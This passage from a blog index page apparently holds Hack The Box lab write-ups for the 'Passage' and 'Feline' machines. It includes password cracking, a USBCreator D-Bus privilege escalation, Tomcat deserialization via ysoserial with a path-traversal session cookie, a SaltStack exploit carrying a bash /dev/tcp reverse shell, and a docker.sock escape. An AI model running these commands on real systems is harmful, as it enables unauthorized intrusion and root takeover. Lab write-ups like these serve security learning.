+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="number">7144</span>a<span class="number">8</span>b<span class="number">531</span><span class="keyword">c</span><span class="number">27</span>a<span class="number">60</span>b<span class="number">51</span>d<span class="number">81</span>ae<span class="number">16</span>be<span class="number">3</span>a<span class="number">81</span>cef<span class="number">722e11</span>b<span class="number">43</span>a<span class="number">26</span>fde<span class="number">0</span>ca<span class="number">97</span>f<span class="number">9e1485</span>e<span class="number">1</span></span><br><span class="line"><span class="number">4</span>bdd<span class="number">0</span>a<span class="number">0</span>bb<span class="number">47</span>fc<span class="number">9</span>f<span class="number">66</span>cbf<span class="number">1</span>a<span class="number">8982</span>fd<span class="number">2</span>d<span class="number">344</span>d<span class="number">2</span>aec<span class="number">283</span>d<span class="number">1</span>afaebb<span class="number">4653</span>ec<span class="number">3954</span>dff<span class="number">88</span></span><br><span class="line">e<span class="number">26</span>f<span class="number">3e86</span>d<span class="number">1</span>f<span class="number">8108120723</span>ebe<span class="number">690e5</span>d<span class="number">3</span>d<span class="number">61628</span>f<span class="number">4130076</span>ec<span class="number">6</span>cb<span class="number">43</span>f<span class="number">16</span>f<span class="number">497273</span>cd</span><br><span class="line">f<span class="number">669</span>a<span class="number">6</span>f<span class="number">691</span>f<span class="number">98</span>ab<span class="number">0562356</span><span class="keyword">c</span><span class="number">0</span>cd<span class="number">5</span>d<span class="number">5e7</span>dcdc<span class="number">20</span>a<span class="number">07941</span><span class="keyword">c</span><span class="number">86</span>adcfce<span class="number">9</span>af<span class="number">3085</span>fbeca</span><br><span class="line"><span class="number">4</span>db<span class="number">1</span>f<span class="number">0</span>bfd<span class="number">63</span>be<span class="number">058</span>d<span class="number">4</span>ab<span class="number">04</span>f<span class="number">18</span>f<span class="number">65331</span>ac<span class="number">11</span>bb<span class="number">494</span>b<span class="number">5792</span><span class="keyword">c</span><span class="number">480</span>faf<span class="number">7</span>fb<span class="number">0</span><span class="keyword">c</span><span class="number">40</span>fa<span class="number">9</span><span class="keyword">cc</span></span><br></pre></td></tr></table></figure>
+
+<p>and we use john and rockyou to decrypt it </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Linux/passage]</span><br><span class="line">└─<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 password</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 5 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])</span><br><span class="line">Warning: poor OpenMP scalability <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=4</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">atlanta1         (?)</span><br><span class="line">1g 0:00:00:01 DONE (2020-09-06 15:08) 0.8403g/s 12053Kp/s 12053Kc/s 48240KC/s (454579)..*7¡Vamos!</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-SHA256&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>we got the password <strong>atlanta1</strong></p>
+<p>we manage su to <strong>paul</strong> account</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">paul@passage:/var/www/html/CuteNews/cdata$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">paul</span><br><span class="line">paul@passage:/var/www/html/CuteNews/cdata$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">paul@passage:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Desktop    Downloads         Music     Public     user.txt</span><br><span class="line">Documents  examples.desktop  Pictures  Templates  Videos</span><br><span class="line">paul@passage:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">3f0dfa31752b3222428868b631ebe589</span><br></pre></td></tr></table></figure>
+
+<p>After some enumeration</p>
+<p>authorized_keys only have one nadav value. That means key belongs nadav. <strong>This key can access to both nadav and paul</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">paul@passage:~/.ssh$ <span class="built_in">cat</span> authorized_keys </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>That means, nadav might have paul’s public key.</p>
+<p>We get the id_rsa key from paul and we are in</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Linux/passage]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa nadav@10.129.5.22</span></span><br><span class="line">load pubkey <span class="string">&quot;id_rsa&quot;</span>: invalid format</span><br><span class="line">Last login: Sun Sep  6 00:21:36 2020 from 10.10.14.6</span><br><span class="line">nadav@passage:~$ </span><br></pre></td></tr></table></figure>
+
+<h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>After some enumeration from process list, we discover d-bus usbcreator is vulnerable to privilege escalation</p>
+<p><a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">USBCreator D-Bus Privilege Escalation in Ubuntu Desktop</a></p>
+<p> We can directly overwrite arbitary files on the file system as root.</p>
+<p>Generate our own ssh key and write it to a file called <strong>ssh_key</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nadav@passage:~$ <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuSKqfg/WNLTFhnw+oY9nBwgoBZm4pRY0ZJHBykTQ9tU2XAR2AE1Hqzkqho7D1/b1sfSLOM1h53vxHzMewMO+xGxQ4n3xdoQmHy+BUJ8igkFlG630Jbu6AOJPU2vigmqr9rxdPSZCk5443tp8p4se2C9k7mOoYNZtRsHTuvq4uHOCOvlIaehIGDiI2zoatklvWdQ4dUDERM4gKo5U4VJ05DteQydkQuBKRTx4zYnO0+Tepkk424Q6aCaalwTfjFJTpEYRMLQrK6sGcijDJL2U/gHIjah3o8bR6aA5jy40P+3mFwMTW2lKAz+dhuyrtrBkvbiDeyrXBxAiDq/G5aiMTBVQA9vrfl0fpUGA2gY8/VqcuJ0cKWhSc3pzLzHO8dnElQD7+VCnJqRsxKjRMngJ5zJmyoIF/DRQZ2klnnW1chrFhi+kmegJuiQACjQqMiG8xgFJqJqy/jKbMMhNoul1y21Dx3de/K4c1LBsvYd0OGeckbLk7KDbxQ0snnVzKLDU= ikonw&quot;</span> &gt; ssh_key</span><br></pre></td></tr></table></figure>
+
+<p>Next called the dbus to overwrite to root’s authorized_keys</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/ssh_key /root/.ssh/authorized_keys <span class="literal">true</span></span><br><span class="line">()</span><br></pre></td></tr></table></figure>
+
+<p>and we got root</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa root@10.129.5.22                                                                                      127 ⨯</span></span><br><span class="line">Last login: Sun Sep  6 02:23:55 2020 from 10.10.14.6</span><br><span class="line">root@passage:~<span class="comment"># cat root.txt &amp;&amp; whoami &amp;&amp; hostname</span></span><br><span class="line">ad8b45d6ef52d901382e54b0d3ecb4ad</span><br><span class="line">root</span><br><span class="line">passage</span><br></pre></td></tr></table></figure>
+
+
+<br/>
+<br/>
+<br/>
+
+
+<p><img src="/images/root.gif" alt="root"></p>
+<br/>
+<br/>
+<br/>
+
+<p><img src="/images/root.gif" alt="root"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/medium/">medium</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/09/06/HTB-Passage/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/09/05/git_talk/">GitTalk 404 error</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Sep 05, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		
+			<p>test</p>
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/gitalk/">gitalk</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/09/05/git_talk/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/08/30/HTB-Feline/">HTB Feline Writeup</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Aug 30, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/HTB-Feline-Hard/image-20200902152351473.png" alt="image-20200902152351473"></p>
+<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><p>Nmap scan:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Making a script scan on all ports</span><br><span class="line">                                                                                                       </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 06:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.205</span><br><span class="line">Host is up (0.0066s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.27</span><br><span class="line">|_http-title: VirusBucket</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.25 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The web seems something related to online malware analyze? </p>
+<p>only service are available</p>
+<p>Found out script.js is loaded </p>
+<p><img src="/images/HTB-Feline-Hard/image-20200902134557499.png" alt="image-20200902134557499"></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> photo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;uploadFile&quot;</span>).<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">let</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="keyword">let</span> email = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;email&quot;</span>).<span class="property">value</span>;</span><br><span class="line"><span class="keyword">let</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line"></span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&quot;image&quot;</span>, photo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/upload.jsp?email=&#x27;</span> + email , &#123; <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>, <span class="attr">body</span>: formData&#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span>=&gt;</span>response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span>=&gt;</span>&#123; </span><br><span class="line">   <span class="keyword">if</span>(data.<span class="title function_">includes</span>(<span class="string">&quot;successfully&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;msg&quot;</span>).<span class="property">innerText</span> = <span class="string">&quot;Upload successful! The report will be sent via e-mail.&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;msg&quot;</span>).<span class="property">innerText</span> = <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="keyword">function</span>(<span class="params">error</span>) &#123; </span><br><span class="line">   <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;msg&quot;</span>).<span class="property">innerText</span> = <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+
+<p>Not too interesting, it fetch the upload.jsp</p>
+<p>However if we upload an empty filename, it will cause the jsp to obtain an error. We found out the upload directory address <em>&#x2F;opt&#x2F;samples&#x2F;uploads</em></p>
+<p>the upload directory is not within the web directory, I have no way to execute malicious payload and execute it through URL.</p>
+<p><img src="/images/HTB-Feline-Hard/image-20200901202222343.png" alt="image-20200901202222343"></p>
+<p>After viewing the rating, it is a CVE-like Box. I don’t see any CMS or suspicious port </p>
+<p><img src="/images/HTB-Feline-Hard/image-20200902135026807.png" alt="image-20200902135026807"></p>
+<p>So I went to google about the <em>Apache Tomcat 9.0.27</em></p>
+<p>And I found <a target="_blank" rel="noopener" href="https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/">CVE-2020-9484</a></p>
+<p>It has some prerequisites for this vulnerability</p>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">- The persistentManager <span class="keyword">is</span> enabled <span class="keyword">and</span> <span class="keyword">it</span>&#x27;s using a *FileStore* (Not too sure <span class="keyword">if</span> this <span class="keyword">is</span> enabled)</span><br><span class="line">- The attacker <span class="keyword">is</span> able <span class="keyword">to</span> upload a <span class="built_in">file</span> <span class="keyword">with</span> arbitrary content, has control <span class="keyword">over</span> <span class="keyword">the</span> filename <span class="keyword">and</span> knows <span class="keyword">the</span> location <span class="keyword">where</span> <span class="keyword">it</span> <span class="keyword">is</span> uploaded (We know <span class="keyword">the</span> uploaded directory)</span><br><span class="line">- There are gadgets <span class="keyword">in</span> <span class="keyword">the</span> *classpath* <span class="keyword">that</span> can be used <span class="keyword">for</span> a java deserialization attack</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://github.com/masahiro331/CVE-2020-9484">Docker environment</a></p>
+<p>First, we have to generate a deserialization object session using <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a></p>
+<p>Do take note that, due to <em>Runtime.getRunTime().exec</em> the arguments with spaces are broken by the StringTokenizer class.</p>
+<p>We have to use base64 to encoding to reduce these issues </p>
+<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">Reference</a></p>
+<p><img src="/images/HTB-Feline-Hard/image-20200901215420440.png" alt="image-20200901215420440"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/docker/ysoserial]</span><br><span class="line">└─<span class="comment"># java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 &quot;$command&quot; &gt; ~/Desktop/hackthebox/Linux/feline/xing.session        </span></span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># curl &#x27;http://10.129.6.132:8080/upload.jsp&#x27; -H &#x27;Cookie: JSESSIONID=../../../../../../../../opt/samples/uploads/xing&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Using curl to pass the JSESSIONID and trigger the malicious session we sent. And we got the shell back.</p>
+<p><img src="/images/HTB-Feline-Hard/image-20200901220111194.png" alt="image-20200901220111194"></p>
+<p>The user flag located at <em>&#x2F;home&#x2F;tomcat&#x2F;user.txt</em></p>
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Via enumeration of network connection we found out 2 suspicious port 4506 and 4505</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat@VirusBucket:/opt/tomcat$ netstat -ntlp</span><br><span class="line">netstat -ntlp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:33443         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::8080                 :::*                    LISTEN      975/java            </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      975/java            </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>After google we found it’s <em>saltstack</em></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/SwitHak/8e7fa45b5656c691ddf13c8c47e8fda6">CVE-2020-11651</a></p>
+<p>And we manage to find the CVE, after we upload the poc, we found the victim doesn’t have python3 salt module.</p>
+<p>We do a port forwarding using chisel</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">Chisel Github</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Client&gt;&gt;  ./chisel_linux client &lt;your ip&gt;:&lt;Port&gt; -R:4506:127.0.0.1:4506</span><br><span class="line">Server&gt;&gt;  ./chisel_linux server -p &lt;Port&gt; --reverse</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Feline-Hard/image-20200902142929771.png" alt="image-20200902142929771"></p>
+<p>Now we have the target port 4506 forward to our port 7777</p>
+<p>Run the POC and execute the bash reverse shell command. And we got the shell back</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 cve_2020-11651.py --<span class="built_in">exec</span> <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.16/1234 0&gt;&amp;1&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Feline-Hard/image-20200902143247467.png" alt="image-20200902143247467"></p>
+<p>However we didnt root the box just so easy. We have the escape the docker environment, get to the host.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@2d24bf61767c:~<span class="comment"># cat todo.txt</span></span><br><span class="line"><span class="built_in">cat</span> todo.txt</span><br><span class="line">- Add saltstack support to auto-spawn sandbox dockers through events.</span><br><span class="line">- Integrate changes to tomcat and make the service open to public.</span><br></pre></td></tr></table></figure>
+
+
+
+<p>After some enumeration, at the <em>.bash_history</em></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> todo.txt </span><br><span class="line"><span class="built_in">printf</span> -- <span class="string">&#x27;- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n&#x27;</span> &gt; todo.txt</span><br><span class="line"><span class="built_in">cd</span> /home/tomcat</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> todo.txt </span><br><span class="line"><span class="built_in">ls</span> -la /var/run/</span><br><span class="line">curl -s --unix-socket /var/run/docker.sock http://localhost/images/json</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><em>&#x2F;var&#x2F;run&#x2F;docker.sock</em> is used in this case.</p>
+<blockquote>
+<p><em>docker.sock</em> is a unix socket of docker daemon listens on default, it can be used to communicate with the daemon from within a container.</p>
+</blockquote>
+<p>We are allow to send commands through the docker.sock to the docker daemon though API.</p>
+<p>that means, we can create a new docker which volume bind to the whole host folder and execute malicious commands.</p>
+<p><a target="_blank" rel="noopener" href="https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">Escaping the Whale: Things you probably shouldn’t do with Docker (Part 1)</a></p>
+<p>According the reference, first we have to get the current docker image</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span><span class="string">&quot;2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Names&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">         <span class="string">&quot;/saltstack&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;188a2704d8b0&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;ImageID&quot;</span><span class="punctuation">:</span><span class="string">&quot;sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Command&quot;</span><span class="punctuation">:</span><span class="string">&quot;/usr/bin/dumb-init /usr/local/bin/saltinit&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Created&quot;</span><span class="punctuation">:</span><span class="number">1593520419</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Ports&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;IP&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PrivatePort&quot;</span><span class="punctuation">:</span><span class="number">4505</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PublicPort&quot;</span><span class="punctuation">:</span><span class="number">4505</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;tcp&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;IP&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PrivatePort&quot;</span><span class="punctuation">:</span><span class="number">4506</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PublicPort&quot;</span><span class="punctuation">:</span><span class="number">4506</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;tcp&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;IP&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PrivatePort&quot;</span><span class="punctuation">:</span><span class="number">8000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PublicPort&quot;</span><span class="punctuation">:</span><span class="number">8000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;tcp&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;PrivatePort&quot;</span><span class="punctuation">:</span><span class="number">22</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;tcp&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">         </span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;State&quot;</span><span class="punctuation">:</span><span class="string">&quot;running&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span><span class="string">&quot;Up 13 hours&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;HostConfig&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">         <span class="attr">&quot;NetworkMode&quot;</span><span class="punctuation">:</span><span class="string">&quot;default&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;NetworkSettings&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">         <span class="attr">&quot;Networks&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;bridge&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">               <span class="attr">&quot;IPAMConfig&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;Links&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;Aliases&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;NetworkID&quot;</span><span class="punctuation">:</span><span class="string">&quot;c344406a0931eb00e8d81114b992959ed104064affada4bc6932702e39c45141&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;EndpointID&quot;</span><span class="punctuation">:</span><span class="string">&quot;a5e320e6a582086035e03f58b570d922c3c7c8be7f782222b47f7421b9bca4e5&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;Gateway&quot;</span><span class="punctuation">:</span><span class="string">&quot;172.17.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;IPAddress&quot;</span><span class="punctuation">:</span><span class="string">&quot;172.17.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;IPPrefixLen&quot;</span><span class="punctuation">:</span><span class="number">16</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;IPv6Gateway&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;GlobalIPv6Address&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;GlobalIPv6PrefixLen&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;MacAddress&quot;</span><span class="punctuation">:</span><span class="string">&quot;02:42:ac:11:00:02&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;DriverOpts&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Mounts&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            